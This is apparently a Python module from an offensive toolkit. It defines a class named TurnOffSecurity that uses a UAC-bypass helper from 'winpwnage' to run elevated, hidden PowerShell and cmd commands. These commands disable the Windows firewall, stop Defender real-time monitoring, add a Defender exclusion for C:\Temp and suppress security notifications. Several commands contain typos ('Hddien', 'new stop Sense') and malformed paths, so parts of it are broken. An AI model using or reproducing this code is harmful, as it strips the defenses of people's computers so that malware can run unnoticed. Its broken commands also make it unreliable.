__import__('sys').path.append('../')
from winpwnage.functions.uac.uacMethod1 import uacMethod1

class TurnOffSecurity(object):
	def __init__(self):
		super(TurnOffSecurity, self).__init__()
		
	def FireWall(self):
		stop_firewall = 'powershell -WindowStyle Hddien -Command "Set-NetFirewallProfile -Enabled False"'
		stop_firewall_service = 'net stop mpssvc'
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall])
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service])

	def Defender(self):
		stop_defender = '-WindowStyle Hddien -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
		stop_defender_service = 'new stop Sense'
		add_exclusion = '-WindowStyle Hddien -Command "Set-MpPreference -ExclusionPath C:\\Temp"'
		off_notifications = r'-WindowStyle Hddien -Command "Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1"'
		uacMethod1([r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', stop_defender])
		uacMethod1([r'c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service])
		uacMethod1([r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', add_exclusion])
		uacMethod1([r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', off_notifications])

